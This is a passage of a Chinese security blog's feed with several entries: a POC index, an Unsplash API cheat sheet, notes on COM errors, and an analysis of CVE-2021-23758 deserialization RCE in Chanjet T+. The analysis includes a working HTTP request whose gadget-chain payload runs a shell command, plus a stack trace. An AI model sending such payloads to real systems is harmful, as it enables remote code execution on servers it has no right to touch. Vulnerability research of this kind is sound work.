href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/" title="【QVD-2023-13612】畅捷通T+ SQL 注入漏洞">【QVD-2023-13612】畅捷通T+ SQL 注入漏洞</a><h3 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h3><h4 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h4><a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="【CVE-2020-0688】exchange远程代码执行漏洞复现">【CVE-2020-0688】exchange远程代码执行漏洞复现</a><h2 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h2><p><a href="https://github.com/stars/holdyounger/lists/poc">Your list &#x2F; POC</a></p><h2 id="好文推荐"><a href="#好文推荐" class="headerlink" title="好文推荐"></a>好文推荐</h2><ol><li><a href="https://bbs.zkaq.cn/t/30534.html">畅捷通T+任意文件上传(CNVD-2022-60632 )漏洞复现- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者</a><br>畅捷通文件结构分析，可执行文件分析</li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：POC 引路&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>【手册】UnSplash 图源API查询手册</title>
    <link href="http://example.com/E_%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91UnSplash%20%E5%9B%BE%E6%BA%90API%E6%9F%A5%E8%AF%A2%E6%89%8B%E5%86%8C/"/>
    <id>http://example.com/E_%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91UnSplash%20%E5%9B%BE%E6%BA%90API%E6%9F%A5%E8%AF%A2%E6%89%8B%E5%86%8C/</id>
    <published>2024-04-16T16:00:00.000Z</published>
    <updated>2024-04-28T06:02:10.601Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：UnSplash 接口快速查询手册</p></blockquote><span id="more"></span><h3 id="通用接口"><a href="#通用接口" class="headerlink" title="通用接口"></a>通用接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/1280x640/?Technology</span><br></pre></td></tr></table></figure><p>支持的分类有： <a href="https://mani-unsplash-clone.netlify.app/s/wallaper">Wallpaper</a>、<a href="https://mani-unsplash-clone.netlify.app/s/nature">Nature</a>、<a href="https://mani-unsplash-clone.netlify.app/s/people">People</a>、<a href="https://mani-unsplash-clone.netlify.app/s/architecture">Architecture</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Events">Events</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Business">Busines</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Experimental">Experimental</a>、<a href="https://mani-unsplash-clone.netlify.app/s/fashion">Fashion</a>、<a href="https://mani-unsplash-clone.netlify.app/s/film">Film</a>、<a href="https://mani-unsplash-clone.netlify.app/s/health">Health</a>、<a href="https://mani-unsplash-clone.netlify.app/s/technology">Technology</a>、<a href="https://mani-unsplash-clone.netlify.app/s/travel">Travel</a>、<a href="https://mani-unsplash-clone.netlify.app/s/textures">Textures</a>、<a href="https://mani-unsplash-clone.netlify.app/s/animals">Animals</a>、<a href="https://mani-unsplash-clone.netlify.app/s/food">Food</a>、<a href="https://mani-unsplash-clone.netlify.app/s/athletics">Athletics</a>、<a href="https://mani-unsplash-clone.netlify.app/s/spirituality">Spirituality</a>、<a href="https://mani-unsplash-clone.netlify.app/s/arts">Arts</a>、<a href="https://mani-unsplash-clone.netlify.app/s/history">History</a></p><h2 id="随机图片"><a href="#随机图片" class="headerlink" title="随机图片"></a>随机图片</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/random</span><br></pre></td></tr></table></figure><h2 id="指定用户"><a href="#指定用户" class="headerlink" title="指定用户"></a>指定用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/user/&#123;USERNAME&#125;</span><br></pre></td></tr></table></figure><p>指定尺寸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/random/&#123;WIDTH&#125;x&#123;HEIGHT&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------</span><br><span class="line">https://source.unsplash.com/random/1280X960</span><br><span class="line">https://source.unsplash.com/random/800X600</span><br><span class="line">https://source.unsplash.com/random/2560X1920</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：UnSplash 接口快速查询手册&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="E_手册" scheme="http://example.com/categories/E-%E6%89%8B%E5%86%8C/"/>
    
    <category term="个人配置" scheme="http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="手册" scheme="http://example.com/tags/%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>【COM】开发经验整理</title>
    <link href="http://example.com/A_OS/Windows/COM/%E3%80%90COM%E3%80%91%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E6%95%B4%E7%90%86/"/>
    <id>http://example.com/A_OS/Windows/COM/%E3%80%90COM%E3%80%91%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E6%95%B4%E7%90%86/</id>
    <published>2024-04-16T16:00:00.000Z</published>
    <updated>2024-04-18T01:12:39.111Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：开发中遇到的 COM 异常和相关文章整理</p></blockquote><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>COM+ 线程模型</li></ol><h2 id="文章整理"><a href="#文章整理" class="headerlink" title="文章整理"></a>文章整理</h2><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h3><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/component-services-portal">COM+（组件服务） - Win32 apps | Microsoft Learn</a><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/com--contexts-and-threading-models">COM+ 上下文和线程模型 - Win32 apps | Microsoft Learn</a><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/com--threading-models">COM+ 线程模型 - Win32 apps | Microsoft Learn</a></li></ol></li></ol></li></ol><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="创建对象异常"><a href="#创建对象异常" class="headerlink" title="创建对象异常"></a>创建对象异常</h3><h4 id="CoinitializeEx-返回-0x80010106"><a href="#CoinitializeEx-返回-0x80010106" class="headerlink" title="CoinitializeEx 返回 0x80010106"></a>CoinitializeEx 返回 0x80010106</h4><p>关键字：<strong>COINIT_MULTITHREADED</strong> 、<strong>COINIT_APARTMENTTHREADED</strong> </p><p><a href="https://blog.csdn.net/guo_lei_lamant/article/details/123431041">CoInitializeEx返回 “0x80010106“ 或者 “RPC_E_CHANGED_MODE“-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：开发中遇到的 COM 异常和相关文章整理&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="COM" scheme="http://example.com/categories/A-OS/Windows/COM/"/>
    
    
    <category term="COM" scheme="http://example.com/tags/COM/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-04-15T16:00:00.000Z</published>
    <updated>2024-05-10T02:24:27.461Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述： CVE-2021-23758 Ajax.NET Professional 中的 RCE 反序列化漏洞分析及说明</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>Ajax.NET Professional (AjaxPro)是最先把AJAX技术应用在微软.NET环境下框架之一，具有部署简单、使用方便、运行高效等特点； 该框架能够创建一个代理类且可以使客户端的JS代码实现调用服务端的方法，并能返回各种在.NET里使用的类型；使用该框架和直接使用.NET基本无差别。</p><p>该漏洞是由于AjaxPro开源组件.NET Class Handler存在对输入数据限制检查不严格引起的；该AjaxPro框架在JavaScriptDeserializer.DeserializeFromJson函数反序列化过程中，如果通过<code>__type</code>获取的<code>Type</code>对象且可对其<code>Type</code>对象修改，攻击者可利用该漏洞在目标主机上执行任意代码。</p><p>详见后文分析。</p><h2 id="受影响软件"><a href="#受影响软件" class="headerlink" title="受影响软件"></a>受影响软件</h2><h3 id="畅捷通-T-GetStoreWarehouseByStore-反序列化漏洞"><a href="#畅捷通-T-GetStoreWarehouseByStore-反序列化漏洞" class="headerlink" title="畅捷通 T+ GetStoreWarehouseByStore 反序列化漏洞"></a>畅捷通 T+ GetStoreWarehouseByStore 反序列化漏洞</h3><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>T+13.0、T+16.0</p><h3 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>分析内容在<a href="#%E5%A0%86%E6%A0%88">堆栈</a>章节</p><p>漏洞主要是因为<code>ajaxPro</code>组件存在 <code> CVE-2021-23758</code>，但是这个漏洞有个要求是传输的参数类型必须是 <code>object</code></p><p>通过反编译</p><p><code>App_Code.dll</code> 的 <code>Ufida.T.CodeBehind._PriorityLevel </code>中 <code>GetStoreWarehouseByStore</code> 方法满足这个要求</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416102037475.png" class="" title="image-20240416102037475"><p>可以看到 <code>GetStoreWarehouseByStore</code> 由<code>[AjaxMethod]</code>修饰，接收一个 <code>object</code> 类型的参数 <code>storeID</code></p><p>所以路径就是</p><p><code>/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore</code></p><p>&#x2F;tplus 是 nginx 的映射路径，&#x2F;ajaxpro&#x2F;* 则是 web.config 中定义的 ajaxPro 组件处理路径</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>执行 POC 会在 tplus 目录下生成 testwhoami.txt 文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">X-Ajaxpro-Method: GetStoreWarehouseByStore</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: close</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 597</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;storeID&quot;:&#123;</span><br><span class="line">    &quot;__type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;,</span><br><span class="line">    &quot;MethodName&quot;:&quot;Start&quot;,</span><br><span class="line">    &quot;ObjectInstance&quot;:&#123;</span><br><span class="line">        &quot;__type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,</span><br><span class="line">        &quot;StartInfo&quot;: &#123;</span><br><span class="line">            &quot;__type&quot;:&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,</span><br><span class="line">            &quot;FileName&quot;:&quot;cmd&quot;, &quot;Arguments&quot;:&quot;/c whoami &gt; testwhoami.txt&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416155119279.png" class="" title="执行结果"><h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>如上所示POC，可以看到在执行 Arguments 时，ping 命令调用到了 <code>System.Diagnostics.Process.Start</code> 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> System.dll!System.Diagnostics.Process.Start() (IL=0x0000, Native=0x09963278+0x8)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL=epilog, Native=0x6A109B90+0xCA)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E)</span><br><span class="line"> mscorlib.dll!System.RuntimeType.InvokeMember(string name, System.Reflection.BindingFlags bindingFlags, System.Reflection.Binder binder, object target, object[] providedArgs, System.Reflection.ParameterModifier[] modifiers, System.Globalization.CultureInfo culture, string[] namedParams) (IL≈0x073D, Native=0x6A0CE270+0xAC8)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.InvokeMethodOnInstance(out System.Exception e) (IL≈0x0025, Native=0x09963000+0x82)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.QueryWorker(object obj) (IL≈0x008C, Native=0x09962750+0xF5)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.BeginQuery() (IL=epilog, Native=0x03A4FE18+0xC8)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.ObjectInstance.set(object value) (IL=epilog, Native=0x09962DB8+0x9B)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL≈0x0016, Native=0x6A109B90+0x61)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] index, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A0EF6E0+0x65)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, object[] index) (IL=epilog, Native=0x6A0EF6C0+0x18)</span><br><span class="line">&gt;AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) (IL≈0x015E, Native=0x03A67FF8+0x311)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) (IL≈0x0151, Native=0x00CF5D30+0x2E6)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() (IL≈0x0180, Native=0x12CA1F98+0x290)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() (IL≈0x01F6, Native=0x12CA0040+0x3B8)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=0x0010, Native=0x12C7FA58+0x2C)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL≈0x018D, Native=0x12A84DC0+0x305)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=0x0E35F2A8+0x6E)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, ref bool completedSynchronously) (IL≈0x0015, Native=0x0E35F070+0x4A)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ApplicationStepManager.ResumeSteps(System.Exception error) (IL≈0x00F6, Native=0x0E35D228+0x1C7)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.System.Web.IHttpAsyncHandler.BeginProcessRequest(System.Web.HttpContext context, System.AsyncCallback cb, object extraData) (IL=0x005C, Native=0x0E35CC68+0xDC)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestInternal(System.Web.HttpWorkerRequest wr) (IL≈0x015B, Native=0x06F5CCF0+0x29B)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestNoDemand(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A7C0+0x4F)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequest(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A540+0x31)</span><br><span class="line"> Chanjet.TP.WebServer.dll!Mono.WebServer.MonoWorkerRequest.ProcessRequest() (IL≈0x000F, Native=0x06F59E20+0x37)</span><br><span class="line"> Chanjet.TP.WebServer.dll!Mono.WebServer.BaseApplicationHost.ProcessRequest(Mono.WebServer.MonoWorkerRequest mwr) (IL≈0x002A, Native=0x06F59C38+0x5E)</span><br><span class="line"> Chanjet.TP.WebServer.FastCgi.exe!Mono.WebServer.FastCgi.ApplicationHost.ProcessRequest(Mono.WebServer.FastCgi.Responder responder) (IL=0x0055, Native=0x06F53E50+0x10D)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.StackBuilderSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL=???, Native=0x6A0D42B0+0x1F4)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.ServerObjectTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x0048, Native=0x6A0D4238+0x67)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.ServerContextTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x004F, Native=0x6A0D413C+0x8B)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessageCallback(object[] args) (IL≈0x0059, Native=0x6A0D3E94+0x98)</span><br><span class="line"> mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x001F, Native=0x6A0D3D40+0xA1)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.ChannelServices.SyncDispatchMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL≈0x0042, Native=0x6A0EAF38+0x93)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (IL≈0x0047, Native=0x6A0D2F50+0xF4)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatchCallback(object[] args) (IL≈0x0016, Native=0x6A0D77EC+0x84)</span><br><span class="line"> mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD)</span><br><span class="line"> [程序域转换]</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (IL≈0x0002, Native=0x6A0D2E5C+0x7A)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x0053, Native=0x6A0D24AC+0x9A)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.CallProcessMessage(System.Runtime.Remoting.Messaging.IMessageSink ms, System.Runtime.Remoting.Messaging.IMessage reqMsg, System.Runtime.Remoting.Contexts.ArrayWithSize proxySinks, System.Threading.Thread currentThread, System.Runtime.Remoting.Contexts.Context currentContext, bool bSkippingContextChain) (IL≈0x003A, Native=0x6A0D22EC+0x51)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.InternalInvoke(System.Runtime.Remoting.Messaging.IMethodCallMessage reqMcmMsg, bool useDispatchMessage, int callType) (IL=???, Native=0x6A0D2070+0x1DE)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.Invoke(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL=epilog, Native=0x6A0D2000+0x69)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(ref System.Runtime.Remoting.Proxies.MessageData msgData, int type) (IL≈0x0155, Native=0x6A0D1DA0+0xF4)</span><br><span class="line"> Chanjet.TP.WebServer.FastCGI.exe!Mono.WebServer.FastCgi.Responder.Process() (IL=0x0068, Native=0x039C3988+0x162)</span><br><span class="line"> Chanjet.TP.WebServer.FastCGI.exe!Mono.FastCgi.ResponderRequest.Worker(object state) (IL≈0x0002, Native=0x039C37C8+0x4B)</span><br><span class="line"> mscorlib.dll!System.Threading.QueueUserWorkItemCallback.WaitCallback_Context(object state) (IL=epilog, Native=0x6A0F0960+0x44)</span><br><span class="line"> mscorlib.dll!System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL≈0x0079, Native=0x6A047D70+0xC4)</span><br><span class="line"> mscorlib.dll!System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL=epilog, Native=0x6A047D50+0x17)</span><br><span class="line"> mscorlib.dll!System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem() (IL=epilog, Native=0x6A0F09B0+0x45)</span><br><span class="line"> mscorlib.dll!System.Threading.ThreadPoolWorkQueue.Dispatch() (IL=0x00A4, Native=0x6A0E1920+0x19D)</span><br><span class="line"> mscorlib.dll!System.Threading._ThreadPoolWaitCallback.PerformWaitCallback() (IL=epilog, Native=0x6A0E1910+0xB)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上所示一大堆，只需要关注其中的几个就可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type)</span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type)</span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() </span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run()</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context)</span><br></pre></td></tr></table></figure><h4 id="堆栈-漏"><a href="#堆栈-漏" class="headerlink" title="堆栈&amp;漏"></a>堆栈&amp;漏</h4><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>从上面分析可知，如果要控制反序列化操作的 <code>Type</code>，那么必须保证 Ajax 处理函数的输出参数类型是可控的，而 <code>GetStoreWarehouseByStore</code> 函数的输入参数为 <code>Objectt</code> 类型，符合当前漏洞要求：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416155500241.png" class="" 